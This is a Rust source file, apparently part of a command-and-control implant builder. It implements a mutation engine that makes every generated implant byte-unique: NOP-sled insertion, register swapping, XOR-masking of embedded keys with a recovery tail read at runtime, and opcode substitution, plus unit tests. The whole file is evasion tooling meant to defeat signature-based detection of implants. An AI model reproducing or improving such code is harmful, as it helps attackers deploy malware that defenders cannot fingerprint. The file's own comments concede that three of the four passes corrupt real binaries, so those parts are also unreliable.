//! Binary mutation engine for per-implant uniqueness.
//!
//! Applies a set of deterministic, reversible(ish) mutations to a PE/DLL binary
//! so that every generated implant has a unique byte-level fingerprint — even
//! when the logical payload (keypair, config) differs only in 32 bytes.
//!
//! ## Passes
//!
//! 1. **NOP insertion** — inserts NOP-equivalent sleds after detected
//!    instruction boundaries (ret, call, jmp, existing NOP), adjusting relative
//!    displacements in nearby call/jmp so the binary still executes correctly.
//! 2. **Register rotation** — swaps paired volatile registers (r8↔r9, r10↔r11,
//!    r12↔r13, r14↔r15) in non-ABI-critical regions so register-pressure
//!    patterns differ per implant.
//! 3. **Key randomization** — XORs candidate 32-byte high-entropy constants
//!    (likely keys) with per-key random masks and stores the masks in a new
//!    `.nyx_mut` PE section so the implant can undo the transform at runtime.
//! 4. **Instruction substitution** — replaces select opcodes with semantically
//!    equivalent alternatives (same length, same semantics) in safe regions,
//!    altering the opcode-frequency fingerprint without changing behavior.
//!
//! All passes are seeded from a single u64 for deterministic output: same
//! (input bytes, seed) → same mutated bytes every time.

use rand::rngs::StdRng;
use rand::Rng;
use rand::SeedableRng;

// ── Public API ────────────────────────────────────────────────────────────────

/// Which mutation passes to apply.
///
/// # Default
///
/// Only the `keys` pass is enabled by default. The `nops`, `registers`, and
/// `substitute` passes are **soundness-unsafe**: they mutate instruction bytes
/// without a real x86-64 decoder, so they cannot correctly fix up RIP-relative
/// ModRM disp32 encodings (`mod==00 && rm==101`, e.g. `lea rax,[rip+disp]`) or
/// reliably distinguish REX prefixes / opcode bytes in a raw byte stream. On a
/// real PE they will produce a crashing binary.
///
/// They are retained for research / fuzzing harnesses that operate on synthetic
/// byte buffers (the in-tree tests construct such buffers). To opt in, construct
/// the struct explicitly, e.g. `MutationPasses { nops: true, ..Default::default() }`.
#[derive(Debug, Clone, Copy)]
pub struct MutationPasses {
    pub nops: bool,
    pub registers: bool,
    pub keys: bool,
    pub substitute: bool,
}

impl Default for MutationPasses {
    fn default() -> Self {
        Self {
            // Soundness-unsafe without a real instruction decoder; off by default.
            nops: false,
            registers: false,
            substitute: false,
            // Safe: operates only on detected high-entropy byte blocks and is
            // self-describing via the appended `.nyx_mut` recovery tail.
            keys: true,
        }
    }
}

/// Summary of what the mutator did to a binary.
#[derive(Debug, Clone, Default)]
pub struct MutationReport {
    pub nops_inserted: usize,
    pub registers_swapped: usize,
    pub keys_randomized: usize,
    pub instructions_substituted: usize,
}

/// The binary mutation engine.
pub struct Mutator {
    seed: u64,
}

impl Mutator {
    /// Create a new mutator seeded from `seed`. Same (input, seed) always
    /// produces the same output — important for reproducibility/audit.
    pub fn new(seed: u64) -> Self {
        Self { seed }
    }

    /// Apply the selected passes to `data` in-place. Returns a report so the
    /// caller can log what changed.
    pub fn mutate(&self, data: &mut Vec<u8>, passes: MutationPasses) -> MutationReport {
        let mut report = MutationReport::default();

        if passes.nops {
            report.nops_inserted = insert_nops(data, self.seed);
        }
        if passes.registers {
            report.registers_swapped = rotate_registers(data, self.seed.wrapping_add(1));
        }
        if passes.keys {
            report.keys_randomized = randomize_keys(data, self.seed.wrapping_add(2));
        }
        if passes.substitute {
            report.instructions_substituted =
                substitute_instructions(data, self.seed.wrapping_add(3));
        }

        report
    }
}

// ── Pass 1: NOP insertion ────────────────────────────────────────────────────

/// Variants of NOP-equivalent instructions we insert. Each variant is a
/// different length, producing diverse sleds.
const NOP_VARIANTS: &[&[u8]] = &[
    &[0x90],                                           // 1B: true NOP
    &[0x66, 0x90],                                     // 2B: operand-size override NOP
    &[0x0F, 0x1F, 0x00],                               // 3B: multi-byte NOP
    &[0x0F, 0x1F, 0x40, 0x00],                         // 4B: multi-byte NOP
    &[0x0F, 0x1F, 0x44, 0x00, 0x00],                   // 5B: multi-byte NOP
    &[0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00],             // 6B
    &[0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00],       // 7B
    &[0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00], // 8B
];

/// Instruction boundaries we consider safe to insert NOPs after.
fn is_instruction_boundary(byte: u8) -> bool {
    matches!(
        byte,
        0xC3 |        // ret (near)
        0xC2 |        // ret imm16
        0xCB |        // ret far
        0xCA // retf imm16
    )
}

/// Returns true if the 5 bytes starting at `offset` in `data` look like a
/// relative call (E8 xx xx xx xx) or jmp (E9 xx xx xx xx).
fn is_rel_branch(data: &[u8], offset: usize) -> bool {
    if offset + 5 > data.len() {
        return false;
    }
    matches!(data[offset], 0xE8 | 0xE9)
}

/// Insert NOP-equivalent sled bytes after detected instruction boundaries.
///
/// Scans for ret instructions. After each boundary, with 50% probability,
/// inserts 1-8 bytes of NOP variants (chosen randomly). Adjusts all subsequent
/// relative call/jmp displacements by the total number of bytes inserted so
/// the binary still executes correctly.
///
/// # SOUNDNESS WARNING — off by default, do not enable on real PEs
///
/// This pass has **no real x86-64 decoder**. It only fixes up `E8`/`E9`
/// relative branches; it does **not** fix up RIP-relative ModRM disp32
/// encodings (`mod==00 && rm==101`, ubiquitous in x86-64 code such as
/// `lea rax,[rip+disp]`, `mov rax,[rip+disp]`, RIP-relative calls, etc.).
/// Inserting bytes before such an instruction shifts its target, so enabling
/// this pass on a real PE will produce a crashing binary. It is retained only
/// for testing on synthetic byte buffers. See `MutationPasses` for how to opt
/// in explicitly.
fn insert_nops(data: &mut Vec<u8>, seed: u64) -> usize {
    let mut rng = StdRng::seed_from_u64(seed);

    let original = data.clone();
    let orig_len = original.len();

    // ── Phase 1: determine how many NOP bytes are inserted before each
    //    original offset. This lets us compute the correct displacement
    //    fixup for relative call/jmp instructions.
    let mut insert_before: Vec<usize> = vec![0usize; orig_len + 1];
    let mut cumulative: usize = 0;
    let mut inserted = 0usize;

    for oj in 0..orig_len {
        insert_before[oj] = cumulative;
        let b = original[oj];
        if is_instruction_boundary(b) && rng.gen_bool(0.5) {
            let variant_idx = rng.gen_range(0..NOP_VARIANTS.len());
            let nop = NOP_VARIANTS[variant_idx];
            cumulative += nop.len();
            inserted += 1;
        }
    }
    insert_before[orig_len] = cumulative;

    // ── Phase 2: build the mutated data with fixup.
    let mut rng2 = StdRng::seed_from_u64(seed); // re-seed for deterministic choices
    data.clear();
    data.reserve(original.len() + cumulative);

    let mut i = 0usize;
    while i < orig_len {
        let b = original[i];

        // Fixup relative call/jmp displacements.
        if is_rel_branch(&original, i) && i + 5 <= orig_len {
            let orig_disp = i32::from_le_bytes([
                original[i + 1],
                original[i + 2],
                original[i + 3],
                original[i + 4],
            ]);
            let orig_target = (i as i64 + 5i64) + orig_disp as i64;
            if orig_target >= 0 && (orig_target as usize) <= orig_len {
                let target_idx = orig_target as usize;
                let new_insn_offset = i + insert_before[i];
                let new_target_offset = target_idx + insert_before[target_idx.min(orig_len)];
                let new_disp = (new_target_offset as i64) - ((new_insn_offset + 5) as i64);
                if new_disp >= i32::MIN as i64 && new_disp <= i32::MAX as i64 {
                    data.push(b);
                    data.extend_from_slice(&(new_disp as i32).to_le_bytes());
                    i += 5;
                    continue;
                }
            }
        }

        data.push(b);

        if is_instruction_boundary(b) && rng2.gen_bool(0.5) {
            let variant_idx = rng2.gen_range(0..NOP_VARIANTS.len());
            let nop = NOP_VARIANTS[variant_idx];
            data.extend_from_slice(nop);
        }

        i += 1;
    }

    inserted
}

// ── Pass 2: Register rotation ────────────────────────────────────────────────

/// Swap registers r8↔r9, r10↔r11, r12↔r13, r14↔r15 within ModRM bytes.
///
/// This is a conservative pass: it only modifies instructions whose REX prefix
/// targets the extended register bank AND which are at least 32 bytes away from
/// any call instruction (so we don't break the ABI around function calls).
///
/// The register encoding in ModRM.reg and ModRM.rm fields (bits 5:3 and 2:0):
///   r8=0, r9=1, r10=2, r11=3, r12=4, r13=5, r14=6, r15=7  (with REX.B or REX.R)
///
/// # SOUNDNESS WARNING — off by default, do not enable on real PEs
///
/// The scan assumes every byte in `0x40..=0x4F` is a REX prefix, but without a
/// real decoder there is no way to know we are at an instruction boundary — the
/// same byte could equally be an opcode, a ModRM, a displacement, or an
/// immediate. Touching such a byte silently corrupts the instruction stream.
/// Additionally the "32-byte window around `0xE8`/`0xFF`" heuristic is not a
/// real control-flow analysis, so even the safe-zone reasoning is unreliable.
/// Retained for testing on synthetic buffers only.
fn rotate_registers(data: &mut [u8], seed: u64) -> usize {
    let mut rng = StdRng::seed_from_u64(seed);

    // Build a "safe zone" map: bytes within 32 bytes of a call (0xE8) are
    // excluded from register rotation to avoid ABI breakage.
    let len = data.len();
    let mut near_call = vec![false; len];
    for (i, &byte) in data.iter().enumerate() {
        if byte == 0xE8 || byte == 0xFF {
            // 0xE8 = call rel32, 0xFF /2 = call r/m (indirect)
            let start = i.saturating_sub(32);
            let end = (i + 32).min(len);
            for nc in &mut near_call[start..end] {
                *nc = true;
            }
        }
    }

    /// Given a 4-bit register field value (0-15), swap paired registers.
    /// Pairs: r8(8)↔r9(9), r10(10)↔r11(11), r12(12)↔r13(13), r14(14)↔r15(15).
    fn swap_reg(reg: u8) -> u8 {
        match reg {
            8 => 9,
            9 => 8,
            10 => 11,
            11 => 10,
            12 => 13,
            13 => 12,
            14 => 15,
            15 => 14,
            _ => reg,
        }
    }

    let mut swapped = 0usize;
    let mut i = 0usize;

    while i + 1 < len {
        // Look for REX prefixes (0x48-0x4F for REX.W=1, or 0x40-0x47 base REX).
        // REX.W=1 (0x48) is the most common for 64-bit ops targeting r8-r15.
        // REX.R (bit 2) and REX.B (bit 0) extend ModRM.reg and ModRM.rm.
        let is_rex = matches!(data[i], 0x40..=0x4F);
        if is_rex && i + 1 < len && !near_call[i] && rng.gen_bool(0.3) {
            let rex = data[i];
            let rex_r = (rex & 0x04) != 0; // REX.R extends ModRM.reg
            let rex_b = (rex & 0x01) != 0; // REX.B extends ModRM.rm
                                           // REX.X (bit 1) extends SIB.index — we skip SIB-index manipulation
                                           // to stay conservative.

            let modrm = data[i + 1];
            let modrm_reg = (modrm >> 3) & 0x07;
            let modrm_rm = modrm & 0x07;

            // Build full register numbers (REX bits as high bit).
            let full_reg = if rex_r { modrm_reg | 0x08 } else { modrm_reg };
            let full_rm = if rex_b { modrm_rm | 0x08 } else { modrm_rm };

            let new_full_reg = swap_reg(full_reg);
            let new_full_rm = swap_reg(full_rm);

            if new_full_reg != full_reg || new_full_rm != full_rm {
                // Reconstruct ModRM.
                let new_modrm_reg = (new_full_reg & 0x07) << 3;
                let new_modrm_rm = new_full_rm & 0x07;
                data[i + 1] = (modrm & 0xC0) | new_modrm_reg | new_modrm_rm;

                // Adjust REX prefix bits.
                let mut new_rex = rex;
                if new_full_reg > 7 {
                    new_rex |= 0x04; // set REX.R
                } else {
                    new_rex &= !0x04; // clear REX.R
                }
                if new_full_rm > 7 {
                    new_rex |= 0x01; // set REX.B
                } else {
                    new_rex &= !0x01; // clear REX.B
                }
                data[i] = new_rex;

                swapped += 1;
            }

            // Skip the ModRM byte and any SIB/displacement so we don't
            // reinterpret displacement bytes as REX prefixes.
            let mod_field = (modrm >> 6) & 0x03;
            let has_sib = mod_field != 0x03 && modrm_rm == 0x04;
            i += if has_sib { 3 } else { 2 };

            // Skip displacement bytes.
            match mod_field {
                0x01 if i < len => {
                    i += 1;
                }
                0x02 if i + 4 <= len => {
                    i += 4;
                }
                _ => {}
            }
            continue;
        }

        i += 1;
    }

    swapped
}

// ── Pass 3: Key randomization ────────────────────────────────────────────────

/// .nyx_cfg section magic value (little-endian).
const NYX_CFG_MAGIC: u32 = 0xDEADBEEF;

/// A candidate key is 32 bytes. To test whether a 32-byte block looks
/// like a key, we count unique bytes. Random data averages ~28 unique bytes
/// out of 32; ASCII text clusters in the printable range and rarely exceeds
/// 15 unique bytes. Threshold: >= 20 unique bytes.
fn looks_like_key(bytes: &[u8]) -> bool {
    if bytes.len() != 32 {
        return false;
    }
    let mut lo = 0u128; // bits 0..127
    let mut hi = 0u128; // bits 128..255
    for &b in bytes {
        if b < 128 {
            lo |= 1u128 << b;
        } else {
            hi |= 1u128 << (b - 128);
        }
    }
    let unique = lo.count_ones() + hi.count_ones();
    unique >= 20
}

/// Add a new `.nyx_mut` section header to the PE binary and append the mask
/// data at the end. Returns the file offset where we wrote the mask data, or
/// None if the PE header can't be found.
///
/// For simplicity, we just append a raw tail blob with a known magic so the
/// implant can find it at load time. The full PE-section approach requires
/// rewriting the section table and updating `SizeOfImage` — complex and
/// fragile. Instead, we append `[magic 0xDA7A0001][mask_count u16][masks...]`
/// and the implant scans for the magic at startup.
const MUT_TAIL_MAGIC: u32 = 0xDA7A0001;

fn randomize_keys(data: &mut Vec<u8>, seed: u64) -> usize {
    let mut rng = StdRng::seed_from_u64(seed);

    // 1. Find the .nyx_cfg section via 0xDEADBEEF magic.
    let cfg_offset = match find_nyx_cfg(data) {
        Some(off) => off,
        None => return 0,
    };

    // Skip the magic (4B), data_len (2B), implant_priv (32B), nonce (12B).
    // The implant_priv at offset cfg_offset+6 is 32 bytes — we DO want to
    // randomize this since it's a real key. But we must keep it because the
    // implant reads it in plaintext. We'll XOR it and store the mask.
    // Actually, the implant reads the private key directly from the section.
    // We CANNOT randomize the private key without breaking the implant.
    // Instead, we skip the .nyx_cfg region entirely and scan the rest of the
    // binary for other key-looking constants.

    let cfg_start = cfg_offset;
    let cfg_end = (cfg_offset + 1024).min(data.len());

    // 2. Scan the binary for 32-byte aligned candidate keys OUTSIDE .nyx_cfg.
    let mut masks: Vec<([u8; 32], usize)> = Vec::new();
    let mut randomized = 0usize;

    // Scan at 4-byte aligned offsets (not 32-byte), but we check 32-byte windows.
    let mut offset = 0usize;
    while offset + 32 <= data.len() {
        // Skip the .nyx_cfg section range.
        if offset >= cfg_start && offset < cfg_end {
            offset = cfg_end;
            continue;
        }

        let candidate = &data[offset..offset + 32];
        if looks_like_key(candidate) && rng.gen_bool(0.4) {
            // Generate a random 32-byte XOR mask.
            let mut mask = [0u8; 32];
            rng.fill(&mut mask);

            // XOR the candidate with the mask.
            for k in 0..32 {
                data[offset + k] ^= mask[k];
            }

            masks.push((mask, offset));
            randomized += 1;

            // The recovery tail stores the mask count as a u16; stop once we
            // hit that limit so we don't silently truncate on write below.
            if randomized > u16::MAX as usize {
                randomized = u16::MAX as usize;
                masks.truncate(u16::MAX as usize);
                break;
            }
        }

        offset += 4; // step by 4 to catch unaligned keys too
    }

    if randomized == 0 {
        return 0;
    }

    // 3. Append the mask recovery tail to the binary.
    // Format:
    //   [magic 0xDA7A0001 u32 LE]
    //   [count  u16 LE]
    //   for each mask:
    //     [offset u32 LE]  — where the XOR was applied
    //     [mask   [32]u8]  — the XOR mask
    data.extend_from_slice(&MUT_TAIL_MAGIC.to_le_bytes());
    data.extend_from_slice(&(randomized as u16).to_le_bytes());
    for (mask, off) in &masks {
        data.extend_from_slice(&(*off as u32).to_le_bytes());
        data.extend_from_slice(mask);
    }

    // Pad to 4-byte alignment for well-formed PE.
    // NOTE: written as `% 4 != 0` (not `!is_multiple_of(4)`) deliberately —
    // `is_multiple_of` only stabilised in Rust 1.87 but our MSRV is 1.80.
    #[allow(clippy::manual_is_multiple_of)] // guarded by MSRV, see note above
    while data.len() % 4 != 0 {
        data.push(0);
    }

    randomized
}

/// Find the .nyx_cfg section by scanning for the 0xDEADBEEF magic.
fn find_nyx_cfg(data: &[u8]) -> Option<usize> {
    let magic_bytes = NYX_CFG_MAGIC.to_le_bytes();
    data.windows(4).position(|w| {
        w[0] == magic_bytes[0]
            && w[1] == magic_bytes[1]
            && w[2] == magic_bytes[2]
            && w[3] == magic_bytes[3]
    })
}

// ── Pass 4: Instruction substitution ──────────────────────────────────────────

/// Replace select opcodes with semantically equivalent alternatives.
///
/// This pass operates on **same-length, same-semantics** opcode pairs so the
/// binary's size and control flow are unchanged — only the byte-level opcode
/// fingerprint differs. It avoids regions near call/jmp (where a wrong guess
/// would be catastrophic) and never touches the first byte of a multi-byte
/// instruction that could be a prefix.
///
/// Substitutions applied (all are well-known x86-64 equivalences):
///
/// | pattern (byte) | substitute | semantics |
/// |---|---|---|
/// | `0x90` (nop) | `0x87 0xC0` (xchg eax,eax) | no-op |
/// | `0x50` (push rax) | `0xFF 0xF0` (push rax via FF /6) | push |
/// | `0x58` (pop rax) | `0x8F 0xC0` (pop rax via 8F /0) | pop |
///
/// The push/pop substitutions change a 1-byte opcode into a 2-byte form, so we
/// only apply them where the following byte is already a NOP (0x90) or a
/// ret (0xC3) — a "dead" byte that absorbs the shift without breaking a
/// subsequent instruction. This keeps the total size unchanged.
///
/// The 0x90→0x87 0xC0 substitution also grows by 1 byte, so we apply the same
/// guard: only when the next byte is 0x90 or 0xC3.
///
/// # SOUNDNESS WARNING — off by default, do not enable on real PEs
///
/// The "absorb the size growth into the following byte" strategy assumes that
/// the byte after the target (`0x90`/`0xC3` check) is genuinely a separate
/// instruction. Without a real decoder we cannot know that — it may be a ModRM,
/// SIB, displacement, or immediate byte of the *current* instruction. Clobbering
/// it corrupts the instruction stream. Retained for testing on synthetic buffers
/// only; see `MutationPasses` for how to opt in explicitly.
fn substitute_instructions(data: &mut [u8], seed: u64) -> usize {
    let mut rng = StdRng::seed_from_u64(seed);
    let len = data.len();
    let mut substituted = 0usize;

    // Build a safe-zone map: skip bytes within 16 bytes of a relative branch
    // (E8/E9) or a return (C3/C2) — same conservatism as register rotation but
    // tighter since substitutions are higher-risk.
    let mut near_branch = vec![false; len];
    for (i, &byte) in data.iter().enumerate() {
        if matches!(byte, 0xE8 | 0xE9 | 0xC3 | 0xC2) {
            let start = i.saturating_sub(16);
            let end = (i + 16).min(len);
            for nb in &mut near_branch[start..end] {
                *nb = true;
            }
        }
    }

    let mut i = 0usize;
    while i < len {
        if near_branch[i] {
            i += 1;
            continue;
        }

        // Only substitute with 30% probability per candidate — enough to shift
        // the opcode-frequency histogram without rewriting every instruction.
        if !rng.gen_bool(0.3) {
            i += 1;
            continue;
        }

        let next_safe = i + 1 < len && matches!(data[i + 1], 0x90 | 0xC3);

        match data[i] {
            // 0x90 (nop) → 0x87 0xC0 (xchg eax, eax) — 2 bytes, needs a dead byte after.
            0x90 if next_safe => {
                data[i] = 0x87;
                data[i + 1] = 0xC0;
                substituted += 1;
                i += 2;
                continue;
            }
            // 0x50 (push rax) → 0xFF 0xF0 (push rax via ModRM /6) — 2 bytes.
            0x50 if next_safe => {
                data[i] = 0xFF;
                data[i + 1] = 0xF0;
                substituted += 1;
                i += 2;
                continue;
            }
            // 0x58 (pop rax) → 0x8F 0xC0 (pop rax via ModRM /0) — 2 bytes.
            0x58 if next_safe => {
                data[i] = 0x8F;
                data[i + 1] = 0xC0;
                substituted += 1;
                i += 2;
                continue;
            }
            _ => {}
        }
        i += 1;
    }

    substituted
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn nop_insertion_is_deterministic() {
        let input = vec![0xC3, 0x90, 0xC3, 0x90, 0xC2, 0x00, 0x00, 0xC3];
        let mut a = input.clone();
        let mut b = input.clone();
        insert_nops(&mut a, 42);
        insert_nops(&mut b, 42);
        assert_eq!(a, b, "same seed must produce identical output");
    }

    #[test]
    fn nop_insertion_different_seeds_produce_different_output() {
        let input = vec![0xC3; 64]; // lots of rets to trigger many NOP insertions
        let mut a = input.clone();
        let mut b = input.clone();
        insert_nops(&mut a, 1);
        insert_nops(&mut b, 2);
        // With 64 rets each with 50% insertion probability, the chance of
        // identical output across two seeds is astronomically small.
        assert_ne!(a, b, "different seeds should produce different output");
    }

    #[test]
    fn nop_variants_are_valid_instructions() {
        // All our NOP variants should start with recognizable NOP prefixes.
        for variant in NOP_VARIANTS {
            assert!(!variant.is_empty());
            // First byte must be a known NOP opcode or prefix.
            assert!(
                matches!(variant[0], 0x90 | 0x66 | 0x0F | 0x48 | 0x4C),
                "variant {:02x?} has unexpected first byte",
                variant
            );
        }
    }

    #[test]
    fn register_rotation_is_deterministic() {
        // Build a synthetic buffer with REX+ModRM instructions.
        // 0x48 = REX.W, 0xC1 = ModRM (mod=11, reg=r8, rm=r9)
        let input = vec![
            0x48, 0xC1, // REX.W + ModRM r8/rm9 → should swap to r9/rm8
            0x90, // NOP spacer
            0x49, 0xD0, // REX.W+R.B + ModRM (reg=r11, rm=r12? let's use known encoding)
            0xC3, // ret
        ];
        let mut a = input.clone();
        let mut b = input.clone();
        rotate_registers(&mut a, 99);
        rotate_registers(&mut b, 99);
        assert_eq!(a, b, "same seed = same register rotation");
    }

    #[test]
    fn register_rotation_skips_near_calls() {
        // Build: [REX+ModRM] [call] [REX+ModRM]
        // The first REX is NOT near a call (32-byte window).
        // The second REX IS within 32 bytes of the call at offset 2.
        let mut data = vec![
            0x48, 0xC1, // at offset 0: far from call
            0xE8, 0x00, 0x00, 0x00, 0x00, // offset 2: call (relative +0)
            0x48, 0xC1, // offset 7: NEAR call (within 32 bytes)
        ];
        let original = data.clone();
        rotate_registers(&mut data, 123);
        // The first REX may change, but the second should be unchanged.
        // We can't guarantee the first changed (30% probability), but we CAN
        // guarantee the second didn't: just check bytes at offset 7 are unchanged.
        assert_eq!(
            data[7], original[7],
            "REX near call must be preserved (ABI-critical)"
        );
        assert_eq!(
            data[8], original[8],
            "ModRM near call must be preserved (ABI-critical)"
        );
    }

    #[test]
    fn key_randomization_detects_high_entropy_blocks() {
        // High-entropy: random bytes → looks like a key.
        let mut rng = StdRng::seed_from_u64(0xCAFE);
        let mut random_key = [0u8; 32];
        rng.fill(&mut random_key);
        assert!(looks_like_key(&random_key));

        // Low-entropy: ASCII text → NOT a key.
        let text = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        assert!(!looks_like_key(text));

        // Zero block: NOT a key.
        let zeros = vec![0u8; 32];
        assert!(!looks_like_key(&zeros));
    }

    #[test]
    fn key_randomization_appends_tail_magic() {
        let mut rng = StdRng::seed_from_u64(0xBEEF);
        // Create a synthetic binary with a .nyx_cfg section and some
        // high-entropy key blocks.
        let mut bin = Vec::new();

        // .nyx_cfg section area (with magic, then implant_priv, etc.)
        bin.extend_from_slice(&NYX_CFG_MAGIC.to_le_bytes()); // magic at offset 0
        bin.extend_from_slice(&[0x10, 0x00]); // data_len = 16
                                              // implant_priv (32 bytes of high-entropy)
        for _ in 0..32 {
            bin.push(rng.gen());
        }
        // Fill rest of 1024-byte section area with zeros
        bin.resize(1024, 0x00);

        // Add some high-entropy blocks outside .nyx_cfg (4-byte aligned).
        // Pad to 4-byte alignment so the scanner (which steps by 4) finds them.
        while bin.len() % 4 != 0 {
            bin.push(0xCC);
        }
        // Several high-entropy blocks to guarantee at least one is found.
        for _block in 0..8 {
            for _ in 0..32 {
                bin.push(rng.gen());
            }
        }

        let count = randomize_keys(&mut bin, 7777);
        // Should have randomized at least one key and appended the tail.
        assert!(
            count > 0,
            "should find and randomize at least one high-entropy block"
        );

        // Check the tail magic is present at the end.
        let magic_bytes = MUT_TAIL_MAGIC.to_le_bytes();
        let tail_pos = bin.windows(4).rposition(|w| w == magic_bytes);
        assert!(
            tail_pos.is_some(),
            "mut tail magic must be present after key randomization"
        );
    }

    #[test]
    fn mutator_full_pipeline_is_deterministic() {
        let mut rng = StdRng::seed_from_u64(0xDEAD);
        let mut bin = Vec::new();
        // Build a minimal mock binary.
        bin.extend(std::iter::repeat_n(0x90u8, 256)); // NOPs
        bin.push(0xC3); // ret
                        // .nyx_cfg section
        bin.extend_from_slice(&NYX_CFG_MAGIC.to_le_bytes());
        bin.push(0x10);
        bin.push(0x00); // data_len
        for _ in 0..32 {
            bin.push(rng.gen::<u8>()); // implant_priv
        }
        bin.resize(bin.len() + (1024 - 38), 0x00);
        // High-entropy key block outside .nyx_cfg
        for _ in 0..32 {
            bin.push(rng.gen());
        }

        let mut a = bin.clone();
        let mut b = bin.clone();

        let m = Mutator::new(12345);
        let report_a = m.mutate(&mut a, MutationPasses::default());
        let report_b = m.mutate(&mut b, MutationPasses::default());

        assert_eq!(a, b, "full pipeline must be deterministic");
        assert_eq!(report_a.nops_inserted, report_b.nops_inserted);
        assert_eq!(report_a.registers_swapped, report_b.registers_swapped);
        assert_eq!(report_a.keys_randomized, report_b.keys_randomized);
        assert_eq!(
            report_a.instructions_substituted,
            report_b.instructions_substituted
        );
    }

    #[test]
    fn mutation_report_tracks_all_passes() {
        let mut bin = vec![0xC3; 64];
        let m = Mutator::new(42);
        // `nops` is off by default (soundness-unsafe); enable explicitly here
        // because this test exercises the NOP-insertion report path.
        let report = m.mutate(
            &mut bin,
            MutationPasses {
                nops: true,
                ..Default::default()
            },
        );
        // nops_inserted should be non-zero (lots of rets, 50% probability).
        assert!(
            report.nops_inserted > 0,
            "NOPs should be inserted after rets"
        );
    }

    #[test]
    fn instruction_substitution_is_deterministic() {
        // 0x90 followed by 0x90 (nop sled) — safe substitution target.
        let input = vec![0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];
        let mut a = input.clone();
        let mut b = input.clone();
        substitute_instructions(&mut a, 55);
        substitute_instructions(&mut b, 55);
        assert_eq!(a, b, "same seed must produce identical substitution");
    }

    #[test]
    fn instruction_substitution_changes_bytes() {
        // Enough NOP pairs that with 30% probability at least one changes.
        let input = [0x90, 0x90].repeat(64);
        let mut a = input.clone();
        let mut b = input.clone();
        substitute_instructions(&mut a, 1);
        substitute_instructions(&mut b, 2);
        assert_ne!(a, b, "different seeds should produce different output");
    }

    #[test]
    fn instruction_substitution_skips_near_branches() {
        // A ret at offset 0 creates a 16-byte safe-zone. The 0x90 at offset 8
        // is within that zone and must NOT be substituted.
        let mut data = vec![
            0xC3, // ret — creates safe zone
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // filler (within 16 bytes)
            0x90, 0x90, // offset 8: within safe zone — must be preserved
        ];
        let original = data.clone();
        substitute_instructions(&mut data, 999);
        assert_eq!(data[8], original[8], "NOP near ret must be preserved");
        assert_eq!(data[9], original[9], "NOP near ret must be preserved");
    }

    #[test]
    fn full_pipeline_includes_substitution_report() {
        // Build a binary with lots of NOP pairs (substitution targets) that are
        // far from any branch.
        let mut bin = [0x90, 0x90].repeat(128); // 256 bytes of nop pairs
        bin.push(0xC3); // ret at the very end
        let m = Mutator::new(777);
        let report = m.mutate(
            &mut bin,
            MutationPasses {
                nops: false,
                registers: false,
                keys: false,
                substitute: true,
            },
        );
        assert!(
            report.instructions_substituted > 0,
            "substitution pass should fire on NOP sleds, got {}",
            report.instructions_substituted
        );
        assert_eq!(report.nops_inserted, 0);
        assert_eq!(report.registers_swapped, 0);
        assert_eq!(report.keys_randomized, 0);
    }
}
